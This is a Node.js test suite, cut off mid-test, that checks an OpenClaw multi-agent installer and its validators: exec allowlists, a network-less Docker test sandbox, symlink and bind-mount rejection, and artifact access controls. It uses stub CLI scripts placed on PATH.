import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from 'node:assert/strict';
import {
  chmodSync,
  cpSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { delimiter, dirname, join, resolve } from 'node:path';
import { spawnSync } from 'node:child_process';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const VALIDATOR = join(ROOT, 'scripts', 'validate-install.sh');
const INSTALL_SH = join(ROOT, 'scripts', 'install.sh');
const POWERSHELL_VALIDATOR = join(ROOT, 'scripts', 'validate-install.ps1');
const DRY_MANIFEST = join(ROOT, 'artifacts', 'install-dryrun', 'install-manifest.dryrun.json');
const BASH_AVAILABLE = spawnSync('bash', ['-lc', 'exit 0'], { encoding: 'utf8' }).status === 0;
const PWSH_AVAILABLE = spawnSync('pwsh', ['-NoProfile', '-Command', 'exit 0'], {
  encoding: 'utf8',
}).status === 0;

test('documents HR model injection and keeps the runtime injector Agent-ID driven', () => {
  const envExample = readFileSync(join(ROOT, '.env.example'), 'utf8');
  const readme = readFileSync(join(ROOT, 'README.md'), 'utf8');
  const modelRouting = readFileSync(join(ROOT, 'docs', 'model-routing.md'), 'utf8');
  const injector = readFileSync(join(ROOT, 'scripts', 'inject-openclaw-models.mjs'), 'utf8');

  assert.match(envExample, /OPENCLAW_AGENT_HR_AGENT_MODEL=provider\/model-id/u);
  assert.match(readme, /openclaw models status --agent manager-agent --json/u);
  assert.match(readme, /node scripts\/inject-openclaw-models\.mjs --apply --yes/u);
  assert.match(modelRouting, /hr-agent.*mydeep\/deepseek-v4-flash/su);
  assert.match(injector, /export function modelEnvironmentKey\(agentId\)/u);
  assert.match(injector, /const key = modelEnvironmentKey\(agent\.id\);/u);
});

test('installers materialize an explicit empty worker delegation allowlist', () => {
  const powershell = readFileSync(join(ROOT, 'scripts', 'install.ps1'), 'utf8');
  const bash = readFileSync(join(ROOT, 'scripts', 'install.sh'), 'utf8');
  assert.match(powershell, /\$currentHasSubagents -and \$allowMatches/u);
  assert.match(powershell, /agents\.list\[\$idx\]\.subagents/u);
  assert.match(powershell, /function Get-OpenClawAgentsWithFallback/u);
  assert.match(powershell, /function Resolve-OpenClawConfigFilePath/u);
  assert.match(powershell, /\$candidate = \$Result\.Output\.Trim\(\)[\s\S]*?\$candidate\.StartsWith\('~'\)[\s\S]*?Join-Path \$HOME/u);
  assert.match(powershell, /function Remove-RetiredStateGraphWebChatReferences/u);
  assert.match(powershell, /remove retired stategraph-webchat plugin references/u);
  assert.match(powershell, /agents\.list 后备配置输出/u);
  assert.match(powershell, /delegationMode = 'prefer'/u);
  assert.doesNotMatch(powershell, /delegationMode = 'off'/u);
  assert.match(bash, /set_json "agents\.list\[\$idx\]\.subagents"/u);
  assert.match(bash, /ALLOW_JSON\[\$id\]/u);
  assert.match(bash, /remove_retired_stategraph_webchat_config/u);
  assert.match(bash, /jq -c '\.agents\.list \/\/ \[\]'/u);
});

test('installers replace the complete Manager exec allowlist with the fixed control entrypoint', () => {
  const powershell = readFileSync(join(ROOT, 'scripts', 'install.ps1'), 'utf8');
  const bash = readFileSync(join(ROOT, 'scripts', 'install.sh'), 'utf8');
  assert.match(powershell, /'approvals','get','--json'/u);
  assert.match(powershell, /function Get-OpenClawJsonWithRetry/u);
  assert.match(
    powershell,
    /Get-OpenClawJsonWithRetry -OcArgs @\('approvals','get','--json'\) -Description 'Manager exec approvals'/u,
  );
  assert.doesNotMatch(powershell, /'approvals','get','--gateway','--json'/u);
  assert.match(powershell, /autoAllowSkills = \$false/u);
  assert.match(bash, /approvals get --json/u);
  assert.doesNotMatch(bash, /approvals get --gateway --json/u);
  assert.match(bash, /autoAllowSkills: false/u);
});

test(
  'PowerShell installer resolves the Manager control entrypoint on Windows',
  { skip: PWSH_AVAILABLE ? false : 'pwsh unavailable in this environment' },
  () => {
    const powershell = readFileSync(join(ROOT, 'scripts', 'install.ps1'), 'utf8');
    const assignment = powershell.match(/^\s*\$managerEntrypoint\s*=.*$/mu)?.[0];
    assert.ok(assignment, 'Manager entrypoint assignment is present');

    const result = spawnSync(
      'pwsh',
      [
        '-NoProfile',
        '-Command',
        `$IsWindows = $true; $RuntimeRootAbs = 'C:\\runtime'; ${assignment}; $managerEntrypoint`,
      ],
      { encoding: 'utf8' },
    );

    assert.equal(result.status, 0, result.stdout + result.stderr);
    assert.equal(result.stdout.trim(), 'C:\\runtime\\manager-control\\manager-control.cmd');
  },
);

test('install validators provision the temporary OpenClaw config they report', () => {
  const powershell = readFileSync(POWERSHELL_VALIDATOR, 'utf8');
  const bash = readFileSync(VALIDATOR, 'utf8');
  assert.match(powershell, /\$validationConfig = Join-Path \$validationBin 'validation-openclaw-config\.json'/u);
  assert.match(bash, /VALIDATION_OPENCLAW_CONFIG="\$VALIDATION_OPENCLAW_BIN\/validation-openclaw-config\.json"/u);
});

test('install validators accept and forward the documented runtime-root parameter', () => {
  const powershell = readFileSync(POWERSHELL_VALIDATOR, 'utf8');
  const bash = readFileSync(VALIDATOR, 'utf8');
  assert.match(powershell, /\[string\]\$RuntimeRoot = 'runtime'/u);
  assert.match(powershell, /-RuntimeRoot \$RuntimeRoot/u);
  assert.match(bash, /--runtime-root\) RUNTIME_ROOT=/u);
  assert.match(bash, /--runtime-root "\$RUNTIME_ROOT"/u);
});

test('install validators require the Node version that provides stable node:sqlite', () => {
  const powershell = readFileSync(POWERSHELL_VALIDATOR, 'utf8');
  const bash = readFileSync(VALIDATOR, 'utf8');
  assert.match(powershell, /22\.13\.0/u);
  assert.match(powershell, /Node\.js 22\.13\.0\+/u);
  assert.match(bash, /22\.13\.0/u);
  assert.match(bash, /Node\.js 22\.13\.0\+/u);
});

function createInstalledManagerPreflightFixture(runtime) {
  const workspace = join(runtime, 'agents', 'manager-agent', 'workspace');
  for (const directory of ['drafts', 'requests', 'receipts']) {
    mkdirSync(join(workspace, '.orchestrator', directory), { recursive: true });
  }
  mkdirSync(join(workspace, 'templates'), { recursive: true });
  mkdirSync(join(runtime, 'manager-control'), { recursive: true });
  for (const name of ['AGENTS.md', 'TOOLS.md']) {
    cpSync(join(ROOT, 'agents', 'manager-agent', 'workspace', name), join(workspace, name));
  }
  cpSync(join(ROOT, 'templates', 'manager-request.deploy.json'), join(workspace, 'templates', 'manager-request.deploy.json'));
  cpSync(join(ROOT, 'scripts', 'manager-control', 'request-submission.mjs'), join(runtime, 'manager-control', 'request-submission.mjs'));
}

for (const [name, command, available] of [
  ['Bash', ['bash', VALIDATOR, '--skip-openclaw', '--runtime-root'], BASH_AVAILABLE],
  ['PowerShell', ['pwsh', '-NoProfile', '-File', POWERSHELL_VALIDATOR, '-SkipOpenClaw', '-RuntimeRoot'], PWSH_AVAILABLE],
]) {
  test(`${name} validator rejects a missing installed Manager request preflight capability`, {
    skip: available ? false : `${name} unavailable in this environment`,
  }, () => {
    const root = mkdtempSync(join(tmpdir(), 'openclaw-manager-preflight-validator-'));
    const runtime = join(root, 'runtime');
    const previousManifest = existsSync(DRY_MANIFEST) ? readFileSync(DRY_MANIFEST) : null;
    try {
      createInstalledManagerPreflightFixture(runtime);
      const complete = spawnSync(command[0], [...command.slice(1), runtime], { cwd: ROOT, encoding: 'utf8' });
      assert.equal(complete.status, 0, complete.stdout + complete.stderr);

      rmSync(join(runtime, 'manager-control', 'request-submission.mjs'));
      const missing = spawnSync(command[0], [...command.slice(1), runtime], { cwd: ROOT, encoding: 'utf8' });

      assert.notEqual(missing.status, 0, missing.stdout + missing.stderr);
      assert.match(missing.stdout, /Manager.*request-submission/u);
    } finally {
      if (previousManifest === null) rmSync(DRY_MANIFEST, { force: true });
      else writeFileSync(DRY_MANIFEST, previousManifest);
      rmSync(root, { recursive: true, force: true });
    }
  });
}

for (const [name, command, available] of [
  ['Bash', ['bash', VALIDATOR, '--skip-openclaw', '--runtime-root'], BASH_AVAILABLE],
  ['PowerShell', ['pwsh', '-NoProfile', '-File', POWERSHELL_VALIDATOR, '-SkipOpenClaw', '-RuntimeRoot'], PWSH_AVAILABLE],
]) {
  test(`${name} validator rejects linked Manager request preflight capabilities`, {
    skip: available ? false : `${name} unavailable in this environment`,
  }, (t) => {
    const root = mkdtempSync(join(tmpdir(), 'openclaw-manager-preflight-link-validator-'));
    const runtime = join(root, 'runtime');
    const outside = join(root, 'outside');
    const workspace = join(runtime, 'agents', 'manager-agent', 'workspace');
    const previousManifest = existsSync(DRY_MANIFEST) ? readFileSync(DRY_MANIFEST) : null;
    try {
      createInstalledManagerPreflightFixture(runtime);
      mkdirSync(join(outside, 'drafts'), { recursive: true });
      writeFileSync(join(outside, 'request-submission.mjs'), 'export {};\n');
      rmSync(join(workspace, '.orchestrator', 'drafts'), { recursive: true });
      try { symlinkSync(join(outside, 'drafts'), join(workspace, '.orchestrator', 'drafts'), process.platform === 'win32' ? 'junction' : 'dir'); }
      catch (error) { t.skip(`current platform does not permit creating a directory link: ${error.code ?? error.message}`); return; }

      const linkedDirectory = spawnSync(command[0], [...command.slice(1), runtime], { cwd: ROOT, encoding: 'utf8' });
      assert.notEqual(linkedDirectory.status, 0, linkedDirectory.stdout + linkedDirectory.stderr);
      assert.match(linkedDirectory.stdout, /Manager drafts/u);

      rmSync(join(workspace, '.orchestrator', 'drafts'));
      mkdirSync(join(workspace, '.orchestrator', 'drafts'));
      rmSync(join(runtime, 'manager-control', 'request-submission.mjs'));
      try { symlinkSync(join(outside, 'request-submission.mjs'), join(runtime, 'manager-control', 'request-submission.mjs')); }
      catch (error) { t.diagnostic(`current platform does not permit creating a file link: ${error.code ?? error.message}`); return; }

      const linkedModule = spawnSync(command[0], [...command.slice(1), runtime], { cwd: ROOT, encoding: 'utf8' });
      assert.notEqual(linkedModule.status, 0, linkedModule.stdout + linkedModule.stderr);
      assert.match(linkedModule.stdout, /Manager.*request-submission/u);
    } finally {
      if (previousManifest === null) rmSync(DRY_MANIFEST, { force: true });
      else writeFileSync(DRY_MANIFEST, previousManifest);
      rmSync(root, { recursive: true, force: true });
    }
  });
}

test('PowerShell validator source retains Manager preflight and reparse-point checks', () => {
  const powershell = readFileSync(POWERSHELL_VALIDATOR, 'utf8');
  for (const value of ['drafts', 'requests', 'receipts', 'manager-request.deploy.json', 'request-submission.mjs', 'orchestrator-validate-request', 'orchestrator-submit-request']) {
    assert.match(powershell, new RegExp(value.replaceAll('.', '\\.'), 'u'));
  }
  assert.match(powershell, /ReparsePoint/u);
});

test('active architecture documents describe Orchestrator dispatch, SQLite, and the Docker test sandbox', () => {
  const configNotes = readFileSync(join(ROOT, 'config', 'openclaw-config-notes.md'), 'utf8');
  const nativeIntegration = readFileSync(join(ROOT, 'docs', 'native-openclaw-integration.md'), 'utf8');
  const compatibility = readFileSync(join(ROOT, 'docs', 'compatibility-report.md'), 'utf8');
  const jsonFlow = readFileSync(join(ROOT, 'docs', 'architect', 'JSON处理流程.md'), 'utf8');
  const modelRouting = readFileSync(join(ROOT, 'docs', 'model-routing.md'), 'utf8');
  const resultContract = JSON.parse(readFileSync(join(ROOT, 'contracts', 'result.schema.json'), 'utf8'));

  assert.match(configNotes, /Manager.*Node Orchestrator/su);
  assert.match(configNotes, /test-agent.*sandbox\.mode.*all.*docker/isu);
  assert.doesNotMatch(configNotes, /本项目 test-agent 用 "off"/u);
  assert.match(nativeIntegration, /Manager.*不.*sessions_spawn/su);
  assert.doesNotMatch(nativeIntegration, /manager-agent` 调度依赖的原生会话工具/u);
  assert.match(compatibility, /当前架构.*Node Orchestrator.*SQLite/su);
  assert.match(jsonFlow, /SQLite.*runs.*tasks.*executions/su);
  assert.doesNotMatch(jsonFlow, /PostgreSQL 创建\/更新 workflow、task、event/u);
  assert.match(modelRouting, /manager-agent.*用户交互.*路线确认/su);
  assert.doesNotMatch(resultContract.properties.summary_for_manager.description, /Manager.*调度/u);
});

test('test-agent keeps session-isolated mounts and prunes idle sandboxes after one hour', () => {
  const testAgentPackage = JSON.parse(readFileSync(join(ROOT, 'agents', 'packages', 'builtin', 'test-agent.json'), 'utf8'));
  const sandboxPolicy = JSON.parse(readFileSync(join(ROOT, 'config', 'test-sandbox-policy.json'), 'utf8'));

  assert.equal(testAgentPackage.sandbox_config.scope, 'session');
  assert.equal(testAgentPackage.sandbox_config.prune.idleHours, 1);
  assert.equal(sandboxPolicy.scope, 'session');
  assert.equal(sandboxPolicy.prune.idle_hours, 1);
});

test('test-agent package and policy expose only the writable staged Docker workspace', () => {
  const testAgent = JSON.parse(readFileSync(join(ROOT, 'agents', 'packages', 'builtin', 'test-agent.json'), 'utf8'));
  const policy = JSON.parse(readFileSync(join(ROOT, 'config', 'test-sandbox-policy.json'), 'utf8'));
  const expectedMounts = {
    worktree: { container_path: '/workspace/.task-sandbox/repo', mode: 'rw' },
    input: { container_path: '/workspace/.task-sandbox/input', mode: 'ro' },
    agent_raw: { container_path: '/workspace/.task-sandbox/output', mode: 'rw' },
    raw_logs: { container_path: '/workspace/.task-sandbox/raw-logs', mode: 'rw' },
  };

  assert.equal(testAgent.sandbox_config.workspaceAccess, 'rw');
  assert.equal(testAgent.sandbox_config.docker.workdir, '/workspace/.task-sandbox/repo');
  assert.equal(policy.workspace_access, 'rw');
  assert.equal(policy.docker.workdir, '/workspace/.task-sandbox/repo');
  assert.deepEqual(policy.mounts, expectedMounts);
  assert.doesNotMatch(JSON.stringify(testAgent.sandbox_config), /"binds"/u);
  assert.doesNotMatch(JSON.stringify(policy.docker), /"binds"/u);
  assert.equal(testAgent.sandbox_config.docker.network, 'none');
  assert.equal(testAgent.sandbox_config.docker.readOnlyRoot, true);
  assert.deepEqual(testAgent.sandbox_config.docker.capDrop, ['ALL']);
  assert.equal(policy.docker.network, 'none');
  assert.equal(policy.docker.read_only_root, true);
  assert.deepEqual(policy.docker.cap_drop, ['ALL']);
});

test('installers synchronize model catalog limits and protect raw artifact storage', () => {
  const powershell = readFileSync(join(ROOT, 'scripts', 'install.ps1'), 'utf8');
  const componentLib = readFileSync(join(ROOT, 'scripts', 'component-lib.ps1'), 'utf8');
  const bash = readFileSync(join(ROOT, 'scripts', 'install.sh'), 'utf8');
  assert.match(powershell, /function Sync-ModelCatalog/u);
  assert.match(powershell, /models\.providers\.\$provider\.models\[\$modelIndex\]\.contextWindow/u);
  assert.match(powershell, /Set-RawArtifactAccessControl/u);
  assert.match(componentLib, /SetAccessRuleProtection\(\$true, \$false\)/u);
  assert.match(componentLib, /OPENCLAW_LLM_CONTEXT_WINDOW_TOKENS' -Default '200000'/u);
  assert.match(componentLib, /OPENCLAW_LLM_MAX_OUTPUT_TOKENS' -Default '32000'/u);
  assert.match(bash, /MODEL_SYNC_SEEN/u);
  assert.match(bash, /ARTIFACT_ACL_MODE="protected-dacl"/u);
  assert.match(bash, /chmod 700 "\$ARTIFACT_ROOT"/u);
});

test(
  'PowerShell artifact ACL helper applies and verifies the platform protection',
  { skip: PWSH_AVAILABLE ? false : 'pwsh unavailable in this environment' },
  () => {
    const temp = mkdtempSync(join(tmpdir(), 'openclaw-artifact-acl-'));
    try {
      const result = spawnSync('pwsh', [
        '-NoProfile',
        '-Command',
        '. $env:COMPONENT_LIB; Set-RawArtifactAccessControl -Path $env:ARTIFACT_ROOT | ConvertTo-Json -Compress',
      ], {
        cwd: ROOT,
        encoding: 'utf8',
        env: {
          ...process.env,
          COMPONENT_LIB: join(ROOT, 'scripts', 'component-lib.ps1'),
          ARTIFACT_ROOT: temp,
        },
      });
      assert.equal(result.status, 0, result.stdout + result.stderr);
      const acl = JSON.parse(result.stdout.trim());
      assert.equal(acl.protected, true);
      assert.equal(acl.mode, process.platform === 'win32' ? 'protected-dacl' : '0700');
    } finally {
      rmSync(temp, { recursive: true, force: true });
    }
  },
);

test('project Agent reinstall requires an explicit stopped-Gateway acknowledgement and deletes only verified runtime paths', () => {
  const reinstall = readFileSync(join(ROOT, 'scripts', 'reinstall-agents.ps1'), 'utf8');
  assert.match(reinstall, /\[switch\]\$GatewayStopped/u);
  assert.match(reinstall, /if \(-not \$GatewayStopped\)/u);
  assert.match(reinstall, /Assert-ManagedAgentIdentity/u);
  assert.match(reinstall, /function Remove-ManagedRuntimeDirectory/u);
  assert.match(reinstall, /Test-PathWithin -Path \$pathAbs -Root \$RuntimeRootAbs/u);
  assert.match(reinstall, /'agents','delete',\$AgentId,'--force','--json'/u);
  assert.match(reinstall, /reinstall-result\.json/u);
});

test('Bash validator isolates its installer dry-run from conflicting outer openclaw agents', {
  skip: BASH_AVAILABLE ? false : 'bash unavailable in this environment',
}, () => {
  const bin = mkdtempSync(join(tmpdir(), 'openclaw-validator-fake-bin-'));
  const runtime = join(bin, 'runtime');
  const fakeOpenClaw = join(bin, 'openclaw');
  const previousManifest = existsSync(DRY_MANIFEST) ? readFileSync(DRY_MANIFEST) : null;

  try {
    createInstalledManagerPreflightFixture(runtime);
    writeFileSync(fakeOpenClaw, `#!/usr/bin/env bash
case "\${1:-}" in
  --version) printf 'fake-openclaw 0\\n' ;;
  config) printf '/tmp/fake-openclaw-config.json\\n' ;;
  agents) printf '[{"id":"manager-agent","workspace":"/host/conflicting-runtime/manager-agent"}]\\n' ;;
  *) exit 0 ;;
esac
    `, 'utf8');
    chmodSync(fakeOpenClaw, 0o755);
    mkdirSync(dirname(DRY_MANIFEST), { recursive: true });
    writeFileSync(DRY_MANIFEST, '{"schema_version":999}\n', 'utf8');

    const result = spawnSync('bash', [VALIDATOR, '--skip-openclaw', '--runtime-root', runtime], {
      cwd: ROOT,
      encoding: 'utf8',
      env: { ...process.env, PATH: `${bin}${delimiter}${process.env.PATH}` },
    });

    assert.equal(result.status, 0, result.stdout + result.stderr);
    assert.match(result.stdout, /\[PASS\].*install\.sh 非项目 cwd dry-run 可执行/);
    const manifest = JSON.parse(readFileSync(DRY_MANIFEST, 'utf8'));
    assert.equal(manifest.schema_version, 2);
    assert.equal(manifest.project_root_abs, ROOT);
    assert.equal(manifest.artifact_access_control.applied, false);
    assert.ok(manifest.agents.every((agent) => agent.context_window_tokens === 200000));
    assert.ok(manifest.agents.every((agent) => agent.max_output_tokens === 32000));
    assert.ok(manifest.agents.every((agent) => agent.max_tokens_field === 'max_output_tokens'));
  } finally {
    if (previousManifest === null) {
      rmSync(DRY_MANIFEST, { force: true });
    } else {
      writeFileSync(DRY_MANIFEST, previousManifest);
    }
    rmSync(bin, { recursive: true, force: true });
  }
});

function installedTestAgent({ externalBinds = false } = {}) {
  const docker = {
    image: 'openclaw-test-node:22-slim',
    workdir: '/workspace/.task-sandbox/repo',
    network: 'none',
    readOnlyRoot: true,
    capDrop: ['ALL'],
    pidsLimit: 256,
    memory: '2g',
    cpus: 2,
  };
  if (externalBinds) docker.binds = ['/host/runtime:/host/runtime:ro'];
  return [{ id: 'test-agent', sandbox: { mode: 'all', backend: 'docker', workspaceAccess: 'rw', docker } }];
}

function writeValidatorOpenClaw(bin, agentsPath, callsPath) {
  const fakeOpenClaw = join(bin, 'openclaw');
  const fakeOpenClawCmd = join(bin, 'openclaw.cmd');
  writeFileSync(fakeOpenClaw, `#!/usr/bin/env bash
printf '%s\\n' "$*" >> "$FAKE_OPENCLAW_CALLS"
case "\${1:-}:\${2:-}:\${3:-}" in
  --version::) printf 'fake-openclaw 0\\n' ;;
  config:validate:*) printf '{"valid":true}\\n' ;;
  config:get:agents.list) cat "$FAKE_OPENCLAW_AGENTS" ;;
  skills:info:*) printf '{"available":true}\\n' ;;
  *) exit 1 ;;
esac
`, 'utf8');
  chmodSync(fakeOpenClaw, 0o755);
  writeFileSync(fakeOpenClawCmd, `@echo off
echo %*>> "%FAKE_OPENCLAW_CALLS%"
if "%~1"=="--version" (echo fake-openclaw 0 & exit /b 0)
if "%~1"=="config" if "%~2"=="validate" (echo {"valid":true} & exit /b 0)
if "%~1"=="config" if "%~2"=="get" if "%~3"=="agents.list" (type "%FAKE_OPENCLAW_AGENTS%" & exit /b 0)
if "%~1"=="skills" if "%~2"=="info" (echo {"available":true} & exit /b 0)
exit /b 1
`, 'utf8');
  return { FAKE_OPENCLAW_AGENTS: agentsPath, FAKE_OPENCLAW_CALLS: callsPath };
}

function runInstalledSandboxValidator(command, agents) {
  const root = mkdtempSync(join(tmpdir(), 'openclaw-installed-sandbox-validator-'));
  const bin = join(root, 'bin');
  const agentsPath = join(root, 'agents.json');
  const callsPath = join(root, 'openclaw-calls.txt');
  const runtime = join(root, 'runtime');
  const previousManifest = existsSync(DRY_MANIFEST) ? readFileSync(DRY_MANIFEST) : null;
  try {
    createInstalledManagerPreflightFixture(runtime);
    mkdirSync(bin, { recursive: true });
    writeFileSync(agentsPath, JSON.stringify(agents), 'utf8');
    const env = writeValidatorOpenClaw(bin, agentsPath, callsPath);
    const runtimeArgs = command[0] === 'pwsh' ? ['-RuntimeRoot', runtime] : ['--runtime-root', runtime];
    const result = spawnSync(command[0], [...command.slice(1), ...runtimeArgs], {
      cwd: ROOT,
      encoding: 'utf8',
      env: { ...process.env, ...env, OPENCLAW_TEST_SANDBOX_ENABLED: 'true', PATH: `${bin}${delimiter}${process.env.PATH}` },
    });
    return { result, calls: readFileSync(callsPath, 'utf8') };
  } finally {
    if (previousManifest === null) {
      rmSync(DRY_MANIFEST, { force: true });
    } else {
      mkdirSync(dirname(DRY_MANIFEST), { recursive: true });
      writeFileSync(DRY_MANIFEST, previousManifest);
    }
    rmSync(root, { recursive: true, force: true });
  }
}

test('PowerShell package loading disables the test-agent sandbox and uses gateway exec when configured', {
  skip: PWSH_AVAILABLE ? false : 'pwsh unavailable in this environment',
}, () => {
  const result = spawnSync('pwsh', ['-NoProfile', '-Command', [
    `. '${join(ROOT, 'scripts', 'component-lib.ps1')}'`,
    `$packages = Get-AgentPackages -ProjectRoot '${ROOT}' -RuntimeRootAbs '${join(ROOT, 'runtime')}'`,
    '$packages | Where-Object id -eq "test-agent" | Select-Object sandbox_mode,sandbox_config,tools_config | ConvertTo-Json -Depth 8 -Compress',
  ].join('; ')], { cwd: ROOT, encoding: 'utf8', env: { ...process.env, OPENCLAW_TEST_SANDBOX_ENABLED: 'false' } });
  assert.equal(result.status, 0, result.stdout + result.stderr);
  const testAgent = JSON.parse(result.stdout.trim());
  assert.equal(testAgent.sandbox_mode, 'off');
  assert.equal(testAgent.sandbox_config.mode, 'off');
  assert.equal(testAgent.tools_config.exec.host, 'gateway');
});

for (const [name, command, available] of [
  ['Bash', ['bash', VALIDATOR], BASH_AVAILABLE],
  ['PowerShell', ['pwsh', '-NoProfile', '-File', POWERSHELL_VALIDATOR], PWSH_AVAILABLE],
]) {
  test(`${name} validator verifies the installed staged test-agent sandbox`, {
    skip: available ? false : `${name} unavailable in this environment`,
  }, () => {
    const { result, calls } = runInstalledSandboxValidator(command, installedTestAgent());

    assert.equal(result.status, 0, result.stdout + result.stderr);
    assert.match(result.stdout, /workspaceAccess.*rw/u);
    assert.match(result.stdout, /\.task-sandbox\/repo/u);
    assert.doesNotMatch(result.stdout, /docker\.binds/u);
    assert.match(result.stdout, /network=none.*readOnlyRoot=true.*capDrop=ALL/iu);
    assert.match(calls, /^config get agents\.list --json$/mu);
    assert.match(calls, /^config validate --json$/mu);
    assert.match(calls, /^skills info skill-creator --agent manager-agent --json$/mu);
    assert.doesNotMatch(calls, /^(?:config set|agents (?:add|delete))/mu);
  });

  test(`${name} validator rejects installed test-agent external bind mounts`, {
    skip: available ? false : `${name} unavailable in this environment`,
  }, () => {
    const { result } = runInstalledSandboxValidator(command, installedTestAgent({ externalBinds: true }));

    assert.notEqual(result.status, 0, result.stdout + result.stderr);
    assert.match(result.stdout, /\[FAIL\].*外部 bind/u);
  });
}

test(
  'PowerShell validator isolates its installer dry-run from conflicting outer openclaw agents',
  { skip: PWSH_AVAILABLE ? false : 'pwsh unavailable in this environment' },
  () => {
    const bin = mkdtempSync(join(tmpdir(), 'openclaw-validator-fake-bin-'));
    const runtime = join(bin, 'runtime');
    const fakeOpenClaw = join(bin, 'openclaw');
    const fakeOpenClawCmd = join(bin, 'openclaw.cmd');
    const previousManifest = existsSync(DRY_MANIFEST) ? readFileSync(DRY_MANIFEST) : null;

    try {
      createInstalledManagerPreflightFixture(runtime);
      writeFileSync(fakeOpenClaw, `#!/usr/bin/env sh
case "\${1:-}" in
  --version) printf 'fake-openclaw 0\\n' ;;
  config) printf '/tmp/fake-openclaw-config.json\\n' ;;
  agents) printf '[{"id":"manager-agent","workspace":"/host/conflicting-runtime/manager-agent"}]\\n' ;;
  *) exit 0 ;;
esac
`, 'utf8');
      chmodSync(fakeOpenClaw, 0o755);
      writeFileSync(fakeOpenClawCmd, `@echo off
if "%~1"=="--version" (echo fake-openclaw 0 & exit /b 0)
if "%~1"=="config" (echo C:\\fake-openclaw-config.json & exit /b 0)
if "%~1"=="agents" (echo [{"id":"manager-agent","workspace":"C:\\host\\conflicting-runtime\\manager-agent"}] & exit /b 0)
exit /b 0
`, 'utf8');
      mkdirSync(dirname(DRY_MANIFEST), { recursive: true });
      writeFileSync(DRY_MANIFEST, '{"schema_version":999}\n', 'utf8');

      const result = spawnSync(
        'pwsh',
        ['-NoProfile', '-File', POWERSHELL_VALIDATOR, '-SkipOpenClaw', '-RuntimeRoot', runtime],
        {
          cwd: ROOT,
          encoding: 'utf8',
          env: { ...process.env, PATH: `${bin}${delimiter}${process.env.PATH}` },
        },
      );

      assert.equal(result.status, 0, result.stdout + result.stderr);
      assert.match(result.stdout, /\[PASS\].*install\.ps1 非项目 cwd dry-run 可执行/);
      const manifest = JSON.parse(readFileSync(DRY_MANIFEST, 'utf8'));
      assert.equal(manifest.schema_version, 2);
      assert.equal(manifest.project_root_abs, ROOT);
      assert.equal(manifest.artifact_access_control.applied, false);
      assert.equal(manifest.artifact_access_control.path_abs, join(ROOT, 'work'));
      assert.ok(manifest.agents.every((agent) => agent.context_window_tokens === 200000));
      assert.ok(manifest.agents.every((agent) => agent.max_output_tokens === 32000));
      assert.ok(manifest.agents.every((agent) => agent.max_tokens_field === 'max_output_tokens'));
    } finally {
      if (previousManifest === null) {
        rmSync(DRY_MANIFEST, { force: true });
      } else {
        writeFileSync(DRY_MANIFEST, previousManifest);
      }
      rmSync(bin, { recursive: true, force: true });
    }
  },
);

test(
  'PowerShell installer deploys the Manager control policy required by the runtime bundle',
  { skip: PWSH_AVAILABLE ? false : 'pwsh unavailable in this environment' },
  () => {
    const root = mkdtempSync(join(tmpdir(), 'openclaw-install-apply-'));
    const bin = join(root, 'bin');
    const runtime = join(root, 'runtime');
    const work = join(ROOT, 'work');
    const workExisted = existsSync(work);
    const config = join(root, 'openclaw.json');
    const agents = join(root, 'agents.json');
    const calls = join(root, 'openclaw-calls.txt');
    const fakeOpenClaw = join(bin, 'openclaw.cmd');

    try {
      mkdirSync(bin, { recursive: true });
      const packages = readdirSync(join(ROOT, 'agents', 'packages', 'builtin'))
        .filter((name) => name.endsWith('.json'))
        .map((name) => JSON.parse(readFileSync(join(ROOT, 'agents', 'packages', 'builtin', name), 'utf8')))
        .filter((value) => value.lifecycle?.register !== false)
        .map((value) => ({
          id: value.id,
          workspace: join(runtime, value.runtime_subdir, 'workspace'),
          agentDir: join(runtime, value.runtime_subdir, 'state'),
        }));
      writeFileSync(config, '{"agents":{"list":[]}}\n');
      writeFileSync(agents, JSON.stringify(packages));
      writeFileSync(fakeOpenClaw, [
        '@echo off',
        'echo %*>> "%FAKE_OPENCLAW_CALLS%"',
        'if "%~1"=="--version" (echo fake-openclaw 0 & exit /b 0)',
        'if "%~1"=="agents" if "%~2"=="list" (type "%FAKE_OPENCLAW_AGENTS%" & exit /b 0)',
        'if "%~1"=="config" if "%~2"=="file" (echo %FAKE_OPENCLAW_CONFIG% & exit /b 0)',
        'if "%~1"=="config" if "%~2"=="get" (type "%FAKE_OPENCLAW_AGENTS%" & exit /b 0)',
        'if "%~1"=="config" if "%~2"=="set" exit /b 0',
        'if "%~1"=="config" if "%~2"=="validate" (echo {"valid":true} & exit /b 0)',
        'if "%~1"=="approvals" if "%~2"=="get" (echo {"file":{"version":1,"agents":{}}} & exit /b 0)',
        'if "%~1"=="approvals" if "%~2"=="set" exit /b 0',
        'exit /b 0',
      ].join('\n'), 'utf8');

      const result = spawnSync(
        'pwsh',
        ['-NoProfile', '-File', join(ROOT, 'scripts', 'install.ps1'), '-Apply', '-Yes', '-RuntimeRoot', runtime],
        {
          cwd: ROOT,
          encoding: 'utf8',
          env: {
            ...process.env,
            PATH: bin + delimiter + process.env.PATH,
            FAKE_OPENCLAW_CONFIG: config,
            FAKE_OPENCLAW_AGENTS: agents,
            FAKE_OPENCLAW_CALLS: calls,
          },
        },
      );

      assert.equal(result.status, 0, result.stdout + result.stderr);
      assert.equal(existsSync(join(runtime, 'manager-control', 'manager-control-policy.json')), true);
      const managerEntrypoint = JSON.parse(readFileSync(join(runtime, 'agents', 'manager-agent', 'workspace', '.orchestrator', 'manager-control-entrypoint.json'), 'utf8'));
      assert.equal(managerEntrypoint.entrypoint, join(runtime, 'manager-control', 'manager-control'));
      for (const directory of ['drafts', 'requests', 'receipts']) {
        assert.equal(existsSync(join(runtime, 'agents', 'manager-agent', 'workspace', '.orchestrator', directory)), true);
      }
      assert.equal(existsSync(join(runtime, 'agents', 'manager-agent', 'workspace', 'templates', 'manager-request.deploy.json')), true);
      assert.equal(existsSync(join(runtime, 'manager-control', 'request-submission.mjs')), true);
      assert.equal(existsSync(join(runtime, 'control', 'runtime-bundle.json')), true);
      assert.equal(existsSync(work), true);
      assert.equal(existsSync(join(runtime, 'worktrees')), false);
      assert.equal(existsSync(join(runtime, 'artifacts')), false);
      const callsText = readFileSync(calls, 'utf8');
